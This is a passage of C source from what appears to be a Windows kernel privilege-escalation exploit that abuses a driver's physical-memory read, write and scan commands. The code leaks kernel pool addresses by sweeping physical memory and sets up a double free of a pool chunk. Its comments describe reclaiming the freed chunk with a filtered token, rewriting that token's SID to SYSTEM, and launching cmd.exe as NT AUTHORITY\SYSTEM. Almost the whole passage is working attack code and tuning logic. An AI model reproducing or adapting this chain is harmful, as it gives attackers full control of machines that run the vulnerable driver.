                                     (LPCVOID)(ULONG_PTR)cap.userVa,
                                     win, kCap, &br) && br == kCap;
            bPhys = DevCmdPhysRead(capPa, pa0, (UINT32)kCap);
            verifiedNow = bWin && bPhys &&
                          memcmp(cmpPa, cmpPhys, kCap) == 0;
            LogW(L"    [E1.6] trial %u verdict: dataKVA=0x%016llx dataPA="
                 L"0x%012llx mdl=0x%016llx route=%ls scanCalls=%u windows=%u "
                 L"maxWin=0x%x floorFails=%u scanned=%llu MB false=%u "
                 L"mdlHits=%u readback=%ls", t,
                 (unsigned long long)dataKVA, (unsigned long long)dataPa,
                 (unsigned long long)mdlKva,
                 mdlKva ? L"block" : mdlRoute ? L"MDL(PFN)" : L"none",
                 scanCalls, okWins, maxWin, floorFails,
                 (unsigned long long)(bytesScanned >> 20),
                 falseHits, mdlHits,
                 verifiedNow ? L"MATCH (phys -> pool -> user window)"
                             : (bWin && bPhys) ? L"MISMATCH (see dumps above)"
                                               : L"incomplete");
            if (!verifiedNow && bWin && bPhys) {
                Dump((ULONG_PTR)cmpPa, kCap);
                Dump((ULONG_PTR)cmpPhys, kCap);
            }
            leaked++;
            if (verifiedNow)
                verified++;
            ProofLog(L"[+] --s2scan trial %u: %ls route; dataKVA="
                     L"0x%016llx dataPA=0x%012llx (block mdl=%ls)%ls", t,
                     mdlKva ? L"BLOCK" : L"MDL(PFN)",
                     (unsigned long long)dataKVA,
                     (unsigned long long)dataPa,
                     mdlKva ? L"seen" : L"not needed",
                     verifiedNow ? L" ; E2E readback MATCH" : L"");
        } else {
            LogW(L"[x] trial %u: userVa pattern NOT found scan 0..%llx "
                 L"(calls=%u clean windows=%u floorFails=%u scanned=%llu MB) "
                 L"-- pattern in unscanned phys or pattern ambiguity", t,
                 (unsigned long long)kTop, scanCalls, okWins, floorFails,
                 (unsigned long long)(bytesScanned >> 20));
            ProofLog(L"[?] --s2scan trial %u: pattern not found over "
                     L"0..%llx (%u clean windows, %u MB scanned)", t,
                     (unsigned long long)kTop, okWins,
                     (unsigned long)(bytesScanned >> 20));
        }
    }

    {
        /* release the anchor with the proven-benign real-pair free (P2b) --
         * the capture blocks stay live, as in --leak and --s2pool runs */
        CONTIGREQ f = anchor;

        if (!DevCmdContigFree(&f))
            ProofLog(L"[x] anchor free failed (detail in the teelog)");
        else
            ProofLog(L"[+] anchor released (real-pair contigfree, proven "
                     L"benign in P2b)");
    }
    ProofLog(L"[P1] E1.6 result over %u trials: leaked %u, E2E-verified "
             L"%u", trials, leaked, verified);
    if (leaked == trials && trials > 0) {
        ProofLog(L"[+] WALK-FREE LEAK CONFIRMED: dataKVA is learnable "
                 L"without any page-table read -- P3e (--s2token) is unblocked");
        rc = 0;
    } else if (leaked > 0)
        rc = 1;
    else
        ProofLog(L"[x] [ABORT] walk-free leak not confirmed -- stop and send "
                 L"the log back");
    return rc;
}

/* ---- v4.0 --s2token: P3e, the end-to-end chain ---------------------------
 * run-8 proved the walk-free leak (E1.6): the capture's user-map MDL hit
 * gives dataKVA AND dataPA. P3e spends them:
 *   M1  victim capture at len L, WARM phys scan (this boot's pool clusters
 *       from run-8, +-2 MB, then the full 0..6 GB sweep) for its userVa
 *       qword -> dataKVA/dataPA; the capture's own user window maps exactly
 *       this buffer
 *   M2  paint a REAL (userVa, MDL) donor pair -- a SECOND capture's reply
 *       userVa plus its user-map MDL (capture block +0x10) from a warm
 *       block-shape scan, pair-verified via physread(MDL+0x10) == userVa --
 *       into dataKVA+0x08/+0x10 -- direct deref through the live window,
 *       WriteProcessMemory fallback, physwrite(dataPA) last resort.
 *       RUN-9 LESSON (0x4E 0x9A, PFN 0x11ffc5): NOT a contig-alloc reply --
 *       contig MDLs are MmProbeAndLockPages-locked and the A8 worker
 *       (only unmap + IoFreeMdl, no MmUnlockPages) leaves one dangling
 *       PFN ref per donor page. Capture pairs have nothing to unlock.
 *   M3  CMD_UNMAP with B = dataKVA: the worker derefs OUR pair
 *       (MmUnmapLockedPages(donor.userVa, donor.mdl) + IoFreeMdl --
 *       balanced for capture MDLs) and ExFreePoolWithTag(dataKVA, 0)
 *       frees the data buffer chunk real+clean; the capture's user mapping
 *       is NEVER unmapped -> stale window survives the fire
 *   M4  the stale user window now reads/writes the FREED chunk (no VAD;
 *       PTEs are real -- RPM and direct deref both work, proven run-0)
 *   M5  NtFilterToken restricted-SID ladder (S-1-0-i, distinct per entry):
 *       a token whose pool bucket is len+0x10 reclaims the chunk; hit =
 *       'Toke' PoolTag at window-0x10 (0x656B6F54)
 *   M6  patch the token body through the stale window: User SID ->
 *       S-1-5-18 (SubAuthorityCount->1, sub[0]=0x12, rest zeroed),
 *       verified with GetTokenInformation THROUGH THE HANDLE -- the E2E
 *       proof that window and handle name the same kernel object
 *   M7  CreateProcessWithTokenW(hTok) spawns cmd.exe /c whoami as
 *       NT AUTHORITY\SYSTEM (CreateProcessAsUserW +
 *       SeAssignPrimaryTokenPrivilege fallback)
 * The double free is load-bearing end to end: the chunk the SID is patched
 * in was freed by the 0xFFF028A8 fire, not by any benign path. */
typedef struct _S2FOUND {
    UINT64 dataKVA;      /* the capture data-buffer KVA (freeable via A8)  */
    UINT64 dataPA;       /* phys PA (MDL PFN route; 0 = block route)       */
    UINT64 mdlKva;       /* the dbuf user-map MDL KVA (block route only)   */
} S2FOUND;

#pragma pack(push, 1)
typedef struct _S2FSID {     /* byte-exact SID with one sub-authority */
    BYTE  rev;
    BYTE  cnt;
    BYTE  ia[6];
    DWORD sub;
} S2FSID;
#pragma pack(pop)

/* self-seeding scan spans. The run-8 clusters are only valid for their own
 * boot: after a crash reboot the full 0..6 GB sweep costs ~30 min at this
 * VM's clean-window geometry (v4.0.2 field: 30-min run killed before M1
 * finished). Every scan hit -- even a false positive -- tells us where this
 * boot's pool objects live, so re-center the span list on it and let all
 * later scans (donor hunt, next len) start there. Strong = a decoded shape;
 * weak = any other hit (goes to a back slot, never displaces strongs). */
static UINT64 g_seedSpan[6][2] = {
    { 0x00008dd30000ULL, 0x00008e140000ULL },  /* run-8 MDL cluster    */
    { 0x0000b5e50000ULL, 0x0000b6280000ULL },  /* run-8 block cluster  */
};

static void S2Seed(UINT64 pa, BOOL strong)
{
    UINT64 lo = pa > 0x200000ULL ? pa - 0x200000ULL : 0;
    UINT64 hi = pa + 0x200000ULL;
    int i;

    for (i = 0; i < 6; i++)
        if (g_seedSpan[i][0] == lo && g_seedSpan[i][1] == hi)
            return;
    if (strong) {
        for (i = 5; i > 0; i--) {
            g_seedSpan[i][0] = g_seedSpan[i - 1][0];
            g_seedSpan[i][1] = g_seedSpan[i - 1][1];
        }
        g_seedSpan[0][0] = lo;
        g_seedSpan[0][1] = hi;
    } else {
        for (i = 5; i >= 0; i--)
            if (!(g_seedSpan[i][0] | g_seedSpan[i][1])) {
                g_seedSpan[i][0] = lo;
                g_seedSpan[i][1] = hi;
                return;
            }
    }
}

/* v4.3.0 region census (preflight): 16 MB slots over RAM probed with one
 * page-aligned 0x100 physread each. 0 = unprobed, 1 = maps, 2 = refused.
 * The 23:19 run proved the refusal axis is REGION (anchor band mapped at
 * misaligned; the PML4 band and much of low RAM refused) -- so the sweep
 * must only spend windows in slots the census says map, and the walk
 * route is decided by the slot the PML4 page lives in. idx = pa >> 24. */
#define CENSUS_STEP  0x1000000ULL
#define CENSUS_MAX   0x140          /* up to 5 GB of slots */
static UINT8  g_census[CENSUS_MAX]; /* 0 unprobed 1 ok 2 dead */
static UINT32 g_censusN = 0;        /* probed slot count */
/* v4.3.0 hoisted transport breakers (run-wide, not span-local): the
 * 23:19 run ground 2668 GLE=8 scan failures across spans/passes with no
 * single counter anywhere noticing -- 256 consecutive refusals anywhere
 * in the sweep now abort the run with the class verdict. */
static UINT32 g_xConsecFail = 0, g_xTotalFail = 0, g_xTotalOK = 0;
static BOOL   g_xBreak = FALSE;     /* set = stop every sweep consumer */
/* ---- preflight profile (filled by MapPreflight, kept run-global) ------ */
typedef struct _MAPPROF {
    BYTE  cls;                     /* 0=A lenient 1=A' alignment-only
                                    * 2=B partial-band 3=C blocked 4=dead */
    BOOL  prAligned, prMis;        /* physread, aligned / +0x10 misaligned,
                                    * both INSIDE the anchor band */
    BOOL  wrOK, capOK;             /* 0xFFF02820 roundtrip / 0xFFF02888 */
    BOOL  scanE2E, scanT;          /* 0xFFF02824: hit verified / transport */
    BOOL  crOK;                    /* CR3 readable + sane */
    BOOL  pml4Aligned, pml4Mis, pml4Lift, pml4LiftEarly;
    BOOL  useWalk;                 /* route decision for M1/M2 */
    BOOL  anchorPainted;
    UINT32 censOK, censDead, censRuns;
    UINT32 liftHit;                /* PML4 lift first-hit offset */
    UINT64 cr3, anchorPa, anchorKva, anchorUserVa;
    UINT64 capSrc;                 /* capture source PA (census-served) */
} MAPPROF;
static MAPPROF g_prof;

/* seed-list wrapper: sweep every known span (most recent hits first).
 * Returns TRUE on a decode hit; FALSE means the caller may still try the
 * full-range fallback. */
static BOOL S2ScanSpan(UINT64 pattern, const DEVREQ *cap, UINT32 capBytes,
                       UINT64 lo, UINT64 hi, S2FOUND *fnd, BOOL wantBlock,
                       const wchar_t *tag);
static BOOL S2SeedScan(UINT64 pattern, const DEVREQ *cap, UINT32 capBytes,
                       S2FOUND *fnd, BOOL wantBlock, const wchar_t *tag)
{
    int i;

    if (g_xBreak)                       /* v4.3.0: a hoisted breaker kill
                                         * stops every sweep consumer */
        return FALSE;
    for (i = 0; i < 6; i++)
        if (g_seedSpan[i][0] | g_seedSpan[i][1])
            if (S2ScanSpan(pattern, cap, capBytes, g_seedSpan[i][0],
                           g_seedSpan[i][1], fnd, wantBlock, tag))
                return TRUE;
    return FALSE;
}

/* one sweep of the --s2scan adaptive loop over [lo, hi): window probing +
 * halving + dead-zone backoff + 4 GB-edge clamps; hits decode as the ADIO
 * block shape or the user-map MDL shape (MDL verified E2E through the
 * capture's own user window before being believed). wantBlock skips MDL
 * shapes (used to hunt a donor's block for its user-map MDL address).
 * tag names the stage in the log ([M1] victim leak vs [M2] donor hunt). */
static BOOL S2ScanSpan(UINT64 pattern, const DEVREQ *cap, UINT32 capBytes,
                       UINT64 lo, UINT64 hi, S2FOUND *fnd, BOOL wantBlock,
                       const wchar_t *tag)
{
    static UINT8 sbuf[SCAN_LEN];
    UINT8  blk[0x40];
    UINT32 winSize = 0x8000000;   /* run-6: 128 MB is the proven clean size */
    UINT32 deadAdv = 0x1000, okStreak = 0;
    UINT32 scanCalls = 0, falseHits = 0, mdlHits = 0;
    UINT32 consecFloorFail = 0;  /* v4.1.2: 4 KB windows failing in a row */
    UINT64 cur = lo, nextBeat = lo;

    /* v4.1.2: run-8 seed clusters are qword-granular (unaligned) hit
     * addresses; a 4 KB window at an unaligned base always spans two
     * pages and is multi-page-rejected on hardened boots -- tile the
     * span in whole pages instead. */
    cur = (cur + 0xFFF) & ~0xFFFULL;
    while (cur < hi) {
        UINT64 start = cur;
        UINT32 mapLen = winSize;
        UINT64 tail = 0x100000000ULL - (start & 0xFFFFFFFFULL);
        UINT32 st = 0;
        UINT64 hitPa = 0;

        if (tail < 0x2000) {          /* 32-bit PA-low-dword wrap edge */
            cur = (start & ~0xFFFFFFFFULL) + 0x100000000ULL;
            continue;
        }
        if ((UINT64)mapLen > tail - 8)
            mapLen = (UINT32)(tail - 8);
        if ((UINT64)mapLen > hi - start)
            mapLen = (UINT32)(hi - start);
        if (cur >= nextBeat) {        /* sweep heartbeat: 1 line / 256 MB */
            LogW(L"    %ls sweep ... PA 0x%012llx (%lu MiB of 0x%012llx.."
                 L"0x%012llx)", tag, (unsigned long long)cur,
                 (unsigned long)((cur - lo) >> 20),
                 (unsigned long long)lo, (unsigned long long)hi);
            nextBeat += 0x10000000ULL;
        }
        if (!DevCmdScan(start, mapLen, 8, 8, 0x40, &pattern, sbuf,
                        &st, &hitPa)) {
            g_xTotalFail++;
            if (++g_xConsecFail >= 256) {
                /* v4.3.0 hoisted breaker: run-wide, counts across spans/
                 * passes (the v4.1.2 counter was span-local and never
                 * saw 2668 GLE=8 failures accumulate in run-14). */
                g_xBreak = TRUE;
                ProofLog(L"[ABORT] %ls hoisted breaker: %u consecutive "
                         L"transport failures (run total fail=%lu ok=%lu) "
                         L"-- this boot refuses MmMapIoSpace beyond the "
                         L"preflight picture; restore S2 and reboot",
                         tag, g_xConsecFail, g_xTotalFail, g_xTotalOK);
                return FALSE;
            }
            if (winSize > 0x1000) {
                UINT32 half = winSize / 2;

                if (half < 0x1000)
                    half = 0x1000;
                winSize = half;
                continue;
            }
            /* v4.1.2 circuit breaker: a page-aligned single-page window
             * being rejected means the transport itself is refusing
             * (hardened-boot MmMapIoSpace policy, GLE=8). Run-10 spammed
             * 311k such lines sweeping a boot where EVERY window fails;
             * 64 in a row cannot be a run of phys holes -- give up. */
            if ((mapLen <= 0x1000) && !(start & 0xFFF) &&
                ++consecFloorFail >= 64) {
                g_xBreak = TRUE;
                LogW(L"[x] %ls sweep aborted: %u consecutive page-aligned "
                     L"4 KB windows rejected (GLE=8) -- this slot refuses "
                     L"the scan window despite a clean census probe; "
                     L"skipping to the next census-OK band", tag,
                     consecFloorFail);
                return FALSE;
            }
            /* v4.3.0: skip refused slots wholesale -- do not dead-advance
             * 9 pages at a time through a 16 MB slot the census already
             * knows is dead (the run-14 grind: 2668 windows, 45 min) */
            if (g_censusN &&
                g_census[(UINT32)(start >> 24)] == 2) {
                cur = (start & ~0xFFFFFFULL) + CENSUS_STEP;
                continue;
            }
            cur += deadAdv;           /* absent page at the 4 KB floor */
            if (deadAdv < 0x100000)
                deadAdv <<= 1;
            continue;
        }
        g_xTotalOK++;
        g_xConsecFail = 0;
        consecFloorFail = 0;
        scanCalls++;
        deadAdv = 0x1000;
        if (st == 0) {
            UINT64 q0 = 0, q1 = 0, q2 = 0, q3 = 0, q4 = 0;

            if (!DevCmdPhysRead(hitPa - 8, blk, 0x40))
                return FALSE;
            q0 = *(UINT64 *)(blk + 0x00);
            q1 = *(UINT64 *)(blk + 0x08);
            q2 = *(UINT64 *)(blk + 0x10);
            q3 = *(UINT64 *)(blk + 0x18);
            q4 = *(UINT64 *)(blk + 0x20);
            if (blk[0] == (UINT8)capBytes && KernelCanonical(q2) &&
                KernelCanonical(q3) && q1 == pattern) {
                /* the capture BLOCK: +0x10 mdl (the dbuf user-map MDL),
                 * +0x18 dataKVA */
                LogW(L"    %ls hit 0x%012llx = ADIO block shape -> "
                     L"dataKVA=0x%016llx mdl=0x%016llx", tag,
                     (unsigned long long)hitPa, (unsigned long long)q3,
                     (unsigned long long)q2);
                S2Seed(hitPa, TRUE);
                fnd->dataKVA = q3;
                fnd->mdlKva  = q2;
                fnd->dataPA  = 0;
                LogW(L"    %ls span scan: %u scan calls, %u false hits",
                     tag, scanCalls, falseHits);
                return TRUE;
            }
            if (KernelCanonical(q0) && q1 == pattern && KernelCanonical(q2) &&
                (q3 & 0xFFFFFFFFULL) == (UINT64)capBytes) {
                /* the user-map MDL over the data buffer (run-8 layout:
                 * +0x10 MappedSystemVa = pattern, +0x18 StartVa, +0x20
                 * lo32 ByteCount / hi32 ByteOffset, +0x28 PFN[0]); the
                 * whole payload is one hit: dataKVA = StartVa+ByteOffset,
                 * dataPA = (PFN0<<12)|ByteOffset */
                UINT64 dataVa  = q2 + (q3 >> 32);
                UINT64 probePa = ((q4 & 0xFFFFFFFFULL) << 12) + (q3 >> 32);
                UINT8  tmp[0x40], usr[0x40];
                SIZE_T br = 0;
                UINT32 clip = (UINT32)(0x1000ULL - (probePa & 0xFFF));
                BOOL   bUsr, bPhys;

                mdlHits++;
                if (wantBlock) {
                    /* donor hunt: the MDL shape tells us the buffer but
                     * not the MDL address itself -- keep scanning, but
                     * weak-seed the spot (same boot, other objects are
                     * likely nearby) */
                    S2Seed(hitPa, FALSE);
                    falseHits++;
                    cur = (hitPa + 8 + 0xFFF) & ~0xFFFULL;   /* v4.1.2: keep page tiling */
                    continue;
                }
                if (clip > 0x40)
                    clip = 0x40;
                bUsr = ReadProcessMemory(GetCurrentProcess(),
                                         (LPCVOID)(ULONG_PTR)cap->userVa,
                                         usr, clip, &br) && br == clip;
                bPhys = bUsr && DevCmdPhysRead(probePa, tmp, clip) &&
                        memcmp(usr, tmp, clip) == 0;
                if (bPhys) {
                    S2Seed(hitPa, TRUE);
                    LogW(L"    %ls hit 0x%012llx = user-map MDL shape "
                         L"(PFN0=0x%08llx) -> dataKVA=0x%016llx dataPA="
                         L"0x%012llx, E2E readback MATCH (%u scan calls, "
                         L"%u false hits)",
                         tag,
                         (unsigned long long)hitPa,
                         (unsigned long long)(q4 & 0xFFFFFFFFULL),
                         (unsigned long long)dataVa,
                         (unsigned long long)probePa, scanCalls, falseHits);
                    fnd->dataKVA = dataVa;
                    fnd->dataPA  = probePa;
                    fnd->mdlKva  = 0;
                    return TRUE;
                }
                falseHits++;
                S2Seed(hitPa, FALSE);
                cur = (hitPa + 8 + 0xFFF) & ~0xFFFULL;   /* v4.1.2: keep page tiling */
                continue;
            }
            falseHits++;
            S2Seed(hitPa, FALSE);
            cur = (hitPa + 8 + 0xFFF) & ~0xFFFULL;   /* v4.1.2: keep page tiling */
            continue;
        }
        cur += mapLen;                /* window mapped + scanned clean */
        okStreak++;
        if (okStreak >= 8 && winSize < 0x8000000) {
            UINT32 grown = winSize * 2;

            winSize = (grown > 0x8000000) ? 0x8000000 : grown;
            okStreak = 0;
        }
    }
    LogW(L"    %ls span 0x%012llx..0x%012llx NOT found (%u scan calls, "
         L"%u false hits, %u MDL shapes)", tag, (unsigned long long)lo,
         (unsigned long long)hi, scanCalls, falseHits, mdlHits);
    return FALSE;
}

/* v4.3.0 census-ordered full sweep: iterates the preflight census's OK
 * runs (contiguous OK 16 MB slots), pool band first -- the 23:19 decode
 * found the pool objects in the 2.2-3.0 GB OK run while every low-RAM
 * window refused; the old code burned the run low-first. Every span goes
 * through S2ScanSpan unchanged (halving/tiling/backoff). g_xBreak stops
 * the whole sweep the moment the hoisted breaker fires. */
static BOOL CensusSweep(UINT64 pattern, const DEVREQ *cap, UINT32 capBytes,
                        S2FOUND *fnd, BOOL wantBlock, const wchar_t *tag)
{
    UINT32 i, pass;

    if (g_xBreak)
        return FALSE;
    if (!g_censusN || g_census[0] != 2) {
        LogW(L"[i] %ls: no census yet -- falling back to the raw "
             L"low-first sweep (legacy path)", tag);
        return S2ScanSpan(pattern, cap, capBytes, 0x100000ULL,
                          0x180000000ULL, fnd, wantBlock, tag);
    }
    for (pass = 0; pass < 2 && !g_xBreak; pass++) {
        for (i = 0; i < g_censusN; i++) {
            UINT32 lo, hi;

            if (g_census[i] != 1)
                continue;
            lo = i;
            while (i + 1 < g_censusN && g_census[i + 1] == 1 &&
                   g_census[i] == 1)
                i++;
            hi = i;
            /* pass 0: runs starting at or above 2 GB (the pool band the
             * 23:19 decode named); pass 1: every other run, ascending */
            if (pass == 0 && (UINT64)lo * CENSUS_STEP < 0x80000000ULL)
                continue;
            if (g_xBreak)
                return FALSE;
            LogW(L"[i] %ls census sweep: OK band 0x%012llx..0x%012llx "
                 L"(%lu MiB)", tag,
                 (unsigned long long)lo * CENSUS_STEP,
                 (unsigned long long)((hi + 1) * CENSUS_STEP),
                 (unsigned long)((hi + 1 - lo) << 4));
            if (S2ScanSpan(pattern, cap, capBytes,
                           (UINT64)lo * CENSUS_STEP,
                           (UINT64)(hi + 1) * CENSUS_STEP, fnd,
                           wantBlock, tag)) {
                return TRUE;
            }
        }
    }
    ProofLog(L"[x] %ls census sweep done: %u OK slots in %u bands, no "
             L"hit (fail=%lu ok=%lu)", tag, g_prof.censOK, g_prof.censRuns,
             g_xTotalFail, g_xTotalOK);
    return FALSE;
}

/* v4.1.5: 'Toke' nonpaged used/allocs from NtQuerySystemInformation
 * (SystemPoolTagInformation). Used to measure the exact token allocation
 * NtFilterToken(n) makes, so M1 can fire at a TOKEN-sized capture len
 * instead of a len no token ever reaches (run on the fresh snapshot:
 * fired at 0xff0, ladder n=0..48 never reclaimed because every filtered
 * token is ~0x810..0xB20 bytes -- under the 0x1000 bucket). */
/* v4.1.6: the guessed layout (base 8, stride 40, used @+32, allocs @+24)
 * field-FAILED: the matched entry read used=0/allocs=0, impossible for
 * real lifetime counters. This version self-calibrates the layout from
 * live data: raw-find every 'Toke' occurrence, score base/stride pairs
 * by the share of entries with printable tag bytes, then identify the
 * used-offset with an open/close token delta (open delta = +s and close
 * returns s -> used; open delta = +1 and close keeps it -> allocs). A
 * hexdump of the buffer head goes to the teelog either way. */
static BYTE  g_qsiBuf[0x20000];
static ULONG g_qsiLen = 0;

static BOOL QsiFetch(ULONG (NTAPI *pqsi)(ULONG, void *, ULONG, ULONG *))
{
    ULONG need = 0x8000;
    LONG  st;

    if (!pqsi)
        return FALSE;
    for (;;) {
        st = (LONG)pqsi(22 /* SystemPoolTagInformation */, g_qsiBuf, need,
                        &need);
        if (st == 0) {
            g_qsiLen = need;
            return TRUE;
        }
        /* v4.1.8: no "must grow" test -- a REFETCH of the same table
         * returns need == g_qsiLen (same boot, same tag count); the old
         * `need <= g_qsiLen` guard rejected that and the probe then
         * re-read the stale static buffer (v4.1.6 AND v4.1.7 zeros). */
        if (st != (LONG)0xC0000004 /* STATUS_INFO_LENGTH_MISMATCH */ ||
            need > sizeof(g_qsiBuf))
            return FALSE;
        if (need > g_qsiLen)
            g_qsiLen = need;
    }
}

/* v4.4.0: current nonpaged-used ULONG for one pool tag, straight from the
 * live table. Layout field-confirmed x4 boots: base 8 / stride 40 /
 * used-field @+16. */
static ULONG QsiTagUsed(const char tag[4])
{
    ULONG qcnt, i;

    if (g_qsiLen < 8)
        return 0xFFFFFFFF;
    qcnt = *(ULONG *)g_qsiBuf;
    if (qcnt > 0x2000)
        return 0xFFFFFFFF;
    for (i = 0; i < qcnt; i++) {
        BYTE *e = g_qsiBuf + 8 + i * 40;

        if (g_qsiLen < 8 + (i + 1) * 40)
            break;
        if (memcmp(e, tag, 4) == 0)
            return *(ULONG *)(e + 16);
    }
    return 0xFFFFFFFF;
}

#if 0  /* v4.1.9: superseded by the full-table diff probe; kept for the layout record:
 * base 8 / stride 40 confirmed on three boots (bufsz = 8 + 40*count exactly) */
static BOOL QsiParse(const char *tag, BYTE **entry, ULONG *count,
                     ULONG *stride)
{
    ULONG i, j, cnt;
    BOOL  found = FALSE;

    if (g_qsiLen < 8)
        return FALSE;
    cnt = *(ULONG *)g_qsiBuf;
    *count = cnt;
    if (cnt > 0x2000)
        return FALSE;
    {   /* raw-find every occurrence of the tag in the buffer */
        ULONG hits = 0;
        LogW(L"[i] [qsi] count=%lu bufsz=0x%lx; raw tag scan:", cnt,
             (unsigned long)g_qsiLen);
        for (i = 0; i + 4 <= g_qsiLen; i++) {
            if (!memcmp(g_qsiBuf + i, tag, 4)) {
                LogW(L"[i] [qsi]   'Toke' at offset 0x%lx", i);
                if (hits++ > 4) break;
            }
        }
        if (!hits)
            LogW(L"[i] [qsi]   no literal 'Toke' occurrence?!  first "
                 L"0x100 bytes dumped below");
    }
    Dump((UINT64)(uintptr_t)g_qsiBuf, 160);
    {   /* self-calibrate base/stride: score = entries with printable
         * tag bytes (poolmon-style tags are 'A'..'Z' mostly) */
        static const BYTE BB[6] = { 4, 8, 4, 8, 4, 8 };
        static const BYTE SS[6] = { 36, 36, 40, 40, 44, 48 };
        for (j = 0; j < 6; j++) {
            ULONG ok = 0, toke = 0;
            for (i = 0; i < cnt; i++) {
                BYTE *q = g_qsiBuf + BB[j] + i * SS[j];
                BYTE  c0 = q[0], c1 = q[1], c2 = q[2], c3 = q[3];
                BYTE  v0 = c0, v1 = c1, v2 = c2, v3 = c3;

                if (g_qsiLen - BB[j] < (i + 1) * SS[j] )
                    break;
                v0 = (v0 >= 'A' && v0 <= 'Z') || v0 == '?' ||
                     (v0 >= '0' && v0 <= '9') || v0 == '_' || v0 == '-';
                v1 = (v1 >= 'A' && v1 <= 'Z') || v1 == '?' ||
                     (v1 >= '0' && v1 <= '9') || v1 == '_' || v1 == '-';
                v2 = (v2 >= 'A' && v2 <= 'Z') || v2 == '?' ||
                     (v2 >= '0' && v2 <= '9') || v2 == '_' || v2 == '-';
                v3 = (v3 >= 'A' && v3 <= 'Z') || v3 == '?' ||
                     (v3 >= '0' && v3 <= '9') || v3 == '_' || v3 == '-';
                if (v0 && v1 && v2 && v3)
                    ok++;
                if (!memcmp(q, tag, 4))
                    toke++;
            }
            LogW(L"[i] [qsi] base=%lu stride=%lu: printable-tag entries "
                 L"%lu/%lu, 'Toke' hits %lu", (unsigned long)BB[j],
                 (unsigned long)SS[j], ok, cnt, toke);
            if (toke >= 1 && i == cnt && ok * 2 > cnt) {
                /* first config that finds 'Toke' with sane tag coverage */
                if (!found) {
                    *stride = SS[j];
                    /* re-locate the tag exactly */
                    BYTE *q = g_qsiBuf + BB[j];
                    for (i = 0; i < cnt; i++, q += SS[j])
                        if (!memcmp(q, tag, 4)) {
                            *entry = q;
                            found = TRUE;
                            LogW(L"[i] [qsi] USING base=%lu stride=%lu",
                                 (unsigned long)BB[j],
                                 (unsigned long)SS[j]);
                            break;
                        }
                }
            }
        }
    }
    return found;
}
#endif

/* ---- v4.3.0 map-profile preflight ----------------------------------------
 * Decides the translation route BEFORE any chain step, from ~350 cheap
 * transport calls, and prints a PROFILE verdict. Basis (IDA + field):
 * every RAM transport is ONE API -- MmMapIoSpace(PA verbatim, MmCached)
 * (docs/worker-audit-218.md; no MmMapIoSpaceEx/MmCopyMemory in the
 * imports) -- and the 23:19 run proved the refusal axis is REGION: the
 * 5 GiB anchor band served a misaligned physwrite AND a misaligned
 * 0x700 capture map while the PML4 page's band refused. So a census of
 * 16 MB slots decides walk-vs-scan, the alignment probes stay as report
 * evidence, and self-tests pin the write/scan/capture families once so
 * the chain never guesses mid-run. Classes:
 *   A  lenient: all RAM maps OK
 *   A' page-aligned-only: misaligned maps refused (alignment axis)
 *   B  partial-band: some RAM regions refuse (census has holes)
 *   C  blocked: no RAM map family at all
 */
static BOOL MapPreflight(CONTIGREQ *anchorOut, BOOL chainFeed)
{
    static const UINT64 sites[6] = { 0x08000000ULL, 0x40000000ULL,
        0x80000000ULL, 0xc0000000ULL, 0x110000000ULL, 0x130000000ULL };
    static const UINT64 mp[2] = { 0x1337C0DE11111111ULL,
                                  0x1337C0DE22222222ULL };
    static const wchar_t *cn[5] = {
        L"A lenient (all RAM maps OK)",
        L"A' page-aligned-only (misaligned maps refused)",
        L"B partial-band (some RAM regions refuse)",
        L"C blocked (no RAM map family)",
        L"dev dead (contig alloc failed)" };
    UINT8  win[0x100], back[0x10], sbuf[SCAN_LEN];
    DEVREQ cp;
    UINT64 pa, aTop, hit = 0;
    UINT32 st = 0, idx, i;
    BYTE   cls;

    ZeroMemory(g_census, sizeof(g_census));
    g_censusN = 0;
    ZeroMemory(&g_prof, sizeof(g_prof));
    Section(L"map-profile preflight (v4.3.0): region census decides the "
            L"route, not the ladder");
    if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, anchorOut)) {
        ProofLog(L"[x] preflight: contig anchor alloc failed (0x28AC) -- "
                 L"no map-independent transport; restore S2 and reboot");
        g_prof.cls = 4;
        return FALSE;
    }
    g_prof.anchorPa     = anchorOut->physPa;
    g_prof.anchorKva    = anchorOut->kva;
    g_prof.anchorUserVa = anchorOut->userVa;
    aTop = (g_prof.anchorPa + 0x1000 + CENSUS_STEP - 1) & ~(CENSUS_STEP - 1);
    if (aTop >> 24 >= CENSUS_MAX)
        aTop = (UINT64)CENSUS_MAX * CENSUS_STEP;

    /* the anchor band first: the anchor's own page is the representative
     * probe (its slot is marked from it, not guessed from the census) */
    g_prof.prAligned = DevCmdPhysRead(g_prof.anchorPa, win, 0x100);
    idx = (UINT32)(g_prof.anchorPa >> 24);
    if (idx < CENSUS_MAX)
        g_census[idx] = g_prof.prAligned ? 1 : 2;
    /* mini-census: 6 more spread sites decide B-vs-C */
    for (i = 0; i < 6; i++) {
        idx = (UINT32)(sites[i] >> 24);
        if (!g_census[idx])
            g_census[idx] = DevCmdPhysRead(sites[i], win, 0x100) ? 1 : 2;
    }
    if (g_prof.prAligned) {
        /* misaligned read inside the serving anchor band (the shape of a
         * walk-entry read); report evidence either way */
        g_prof.prMis = DevCmdPhysRead(g_prof.anchorPa + 0x10, back, 8);
        /* write family roundtrip, 16 bytes at the page base, restored */
        if (DevCmdPhysRead(g_prof.anchorPa, win, 0x10)) {
            g_prof.wrOK = DevCmdPhysWrite(g_prof.anchorPa, mp, 0x10) &&
                          DevCmdPhysRead(g_prof.anchorPa, back, 0x10) &&
                          !memcmp(back, mp, 0x10);
            DevCmdPhysWrite(g_prof.anchorPa, win, 0x10);
        }
        /* scan self-test: paint 16 bytes at +0x20, find them at stride 1
         * (one transport verifies the window map AND the separate dump
         * map at a misaligned PA; the same paint verifies the capture
         * copy below -- 00:10 catch: the old self-test compared the wrong
         * window offset and always read out capOK=0) */
        if (g_prof.wrOK)
            DevCmdPhysWrite(g_prof.anchorPa + 0x20, mp, 0x10);
        if (DevCmdScan(g_prof.anchorPa, 0x1000, 1, 8, 0x40, mp,
                       sbuf, &st, &hit)) {
            g_prof.scanT   = (st == 0 || st == 3);   /* window mapped */
            g_prof.scanE2E = (st == 0 && hit == g_prof.anchorPa + 0x20);
        }
    }
    g_scanLiftOK = g_prof.scanE2E;
    /* CR3 -> PML4 page: the walk's substrate, probed exactly where it
     * lives (the 23:19 run never tested an aligned read of that page --
     * the ladder structurally skipped it for entries past strip 0) */
    {
        UINT64 cr = 0;

        g_prof.crOK = DevCmdCrRead(3, &cr) &&
                      (cr & 0x000FFFFFFFFFF000ULL) &&
                      cr < 0x10000000000ULL;
